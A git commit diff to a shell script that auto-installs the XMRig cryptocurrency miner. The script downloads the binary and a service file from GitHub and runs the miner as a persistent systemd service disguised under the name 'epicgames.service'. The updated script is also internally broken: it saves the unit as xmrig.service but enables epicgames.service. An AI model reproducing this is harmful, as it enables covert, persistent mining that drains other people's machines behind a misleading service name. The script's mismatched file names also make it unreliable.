9973965d283eebd3bb2038a7c720e91655071ee9
MaybeTrollface <86282504+MaybeTrollface@users.noreply.github.com>
2022-09-25 13:45:08 +0200

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -1,6 +1,8 @@
 echo "Autoinstalling XMRig"
-wget https://github.com/MaybeTrollface/autoinstaller-for-xmrig/raw/main/xmrig /usr/local/bin/xmrig
-wget https://raw.githubusercontent.com/MaybeTrollface/autoinstaller-for-xmrig/main/xmrig.service /etc/systemd/system/epicgames.service
+cd ~
+wget https://github.com/MaybeTrollface/autoinstaller-for-xmrig/raw/main/xmrig
+cd /etc/systemd/system/
+wget https://raw.githubusercontent.com/MaybeTrollface/autoinstaller-for-xmrig/main/xmrig.service
 systemctl enable epicgames.service
 systemctl start epicgames.service
 echo "Script probably done. Use systemctl status epicgames.service to check the status!"
